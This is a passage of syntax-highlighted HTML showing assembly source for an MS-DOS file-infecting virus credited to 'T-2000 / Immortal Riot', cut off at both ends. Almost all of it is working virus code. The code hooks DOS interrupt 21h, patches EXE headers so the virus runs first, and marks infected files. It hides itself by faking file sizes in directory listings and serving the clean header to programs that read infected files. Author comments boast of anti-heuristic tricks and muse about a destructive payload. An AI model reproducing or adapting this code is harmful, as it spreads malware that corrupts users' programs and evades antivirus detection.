                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; CX:DI = headersize.</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                  </span><span class="sc1">; Calculate size of image.</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; Calculate virus' new CS:IP.</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; (CX = 16).</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_IP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">     </span><span class="sc1">; Set new CS:IP of host.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_CS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Anti-heuristic.</span><span class="sc0">

                </span><span class="sc1">; Set new SS:SP.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_SS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_SP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size_Mem</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Min_Size_Mem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_EOF</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">          </span><span class="sc1">; Calculate infected size.</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">; Calculate 512-byte pages.</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; Precise division?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">No_Round</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Upround 512-byte pages.</span><span class="sc0">

</span><span class="sc5">No_Round</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Image_512_Pages</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Image_Mod_512</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">Good_Handle</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Marker_File</span><span class="sc0">  </span><span class="sc1">; Mark file as infected.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; Caller's readbuffer.</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BP.Reg_AX</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                  </span><span class="sc1">; Position before read.</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">CLC</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">Bad_Handle</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">STC</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc1">; Hmmm... a destructive payload would fit this topic better don't you think?</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Candyman, Candyman, Candyman, Candyman, ...'</span><span class="sc0">


</span><span class="sc5">Restore_File_Pos</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">File_Pos_Hi</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">File_Pos_Lo</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">OldInt21h</span><span class="sc0">


</span><span class="sc5">Go_BOF</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Set_Pos</span><span class="sc0">

</span><span class="sc5">Go_EOF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
</span><span class="sc5">Set_Pos</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CWD</span><span class="sc0">

</span><span class="sc5">OldInt21h</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int21h</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc1">; I'm used to save the _whole_ header of the host, simply becoz most of my</span><span class="sc0">
</span><span class="sc1">; virii are all full-stealth... this should save the pigs some work also.</span><span class="sc0">

</span><span class="sc5">Host_Bytes</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc12">'ZM'</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Virus_Size_Mem</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Carrier</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Author</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Written by T-2000 / Immortal Riot'</span><span class="sc0">


</span><span class="sc5">NewInt21h</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; ============= FIND FIRST/NEXT FCB =========================================</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">                 </span><span class="sc1">; Findfirst (FCB) ?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Check_4_Find_H</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                 </span><span class="sc1">; Findnext (FCB) ?</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Check_4_Find_H</span><span class="sc0">

</span><span class="sc5">Mirror_FCB</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Save all registers.</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Successful operation?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">JNE_Exit_Mir_S</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">                 </span><span class="sc1">; Get DTA-address.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">BX.FCB_Drive</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; It's an extended FCB ?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">No_Ext_FCB</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                   </span><span class="sc1">; Then skip extended block.</span><span class="sc0">

</span><span class="sc5">No_Ext_FCB</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BX.FCB_Size</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Set index-registers.</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BX.FCB_Name</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BX.FCB_Time</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Edit_DTA</span><span class="sc0">


</span><span class="sc1">; ============= FIND FIRST/NEXT HANDLE ======================================</span><span class="sc0">

</span><span class="sc5">Check_4_Find_H</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">                 </span><span class="sc1">; Findfirst (handle) ?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Check_4_Read</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">                 </span><span class="sc1">; Findnext (handle) ?</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Check_4_Read</span><span class="sc0">

</span><span class="sc5">Mirror_Handle</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Mir_Size</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2F00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">         </span><span class="sc1">; Get DTA-address.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BX.Handle_Name</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Find extension-offset.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REPNE</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BX.Handle_Size</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set index-registers.</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BX.Handle_Time</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Edit_DTA</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">CWD</span><span class="sc0">                             </span><span class="sc1">; DX = 00h.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get filetime.</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011111b</span><span class="sc0">           </span><span class="sc1">; Mask seconds.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">; 60 seconds?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exit_Mir_Size</span><span class="sc0">           </span><span class="sc1">; If so, abort mirror.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; File is over 64k ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Check_COM_Ext</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Min_Size_Infect</span><span class="sc0"> </span><span class="sc1">; Large enough?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_Mir_Size</span><span class="sc0">

</span><span class="sc5">Check_COM_Ext</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'OC'</span><span class="sc0">           </span><span class="sc1">; .COM-extension?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Check_EXE_Ext</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0">
</span><span class="sc5">JNE_Exit_Mir_S</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Mir_Size</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">              </span><span class="sc1">; .COM is bigger than 64k ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Exit_Mir_Size</span><span class="sc0">

                </span><span class="sc1">; .COM is not too big?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">65535</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc4">))</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Add_Size_Virus</span><span class="sc0">

</span><span class="sc5">Check_EXE_Ext</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'XE'</span><span class="sc0">           </span><span class="sc1">; .EXE-entension?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Mir_Size</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Mir_Size</span><span class="sc0">

</span><span class="sc5">Add_Size_Virus</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">     </span><span class="sc1">; Add virussize.</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc1">; Set infected timestamp.</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Exit_Mir_Size</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_Mirror_S</span><span class="sc0">


</span><span class="sc1">; ============= FILE READ ===================================================</span><span class="sc0">

</span><span class="sc5">Check_4_Read</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                 </span><span class="sc1">; Read handle.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Check_4_Seek</span><span class="sc0">

</span><span class="sc5">Mirror_Read</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">               </span><span class="sc1">; Execute read.</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Save all registers.</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Mirror_R</span><span class="sc0">           </span><span class="sc1">; Abort if error occurred.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle_Inf</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Mirror_R</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Read_Over_64k</span><span class="sc0">           </span><span class="sc1">; Read started in 1st 64k ?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; They are reading from the</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Read_Over_64k</span><span class="sc0">           </span><span class="sc1">; header?</span><span class="sc0">

                </span><span class="sc1">; === Mirror the read header. ===</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Calculate end of read.</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Adjust_DI</span><span class="sc0">               </span><span class="sc1">; Overflow?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; They read to the end of</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">No_Adjust_DI</span><span class="sc0">            </span><span class="sc1">; the header?</span><span class="sc0">

</span><span class="sc5">Adjust_DI</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; If so, adjust register.</span><span class="sc0">

</span><span class="sc5">No_Adjust_DI</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                  </span><span class="sc1">; Howmany bytes to mirror?</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BP.Reg_DX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; Copy infected header into</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">                   </span><span class="sc1">; caller's buffer.</span><span class="sc0">

</span><span class="sc5">Read_Over_64k</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">                      </span><span class="sc1">; DI:SI position before read.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BP.Reg_CX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; DI:SI = position after</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; read.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_EOF</span><span class="sc0">

        </span><span class="sc1">; === Check if the read ends above the clean host. ===</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; Check high word.</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Restore_Read</span><span class="sc0">
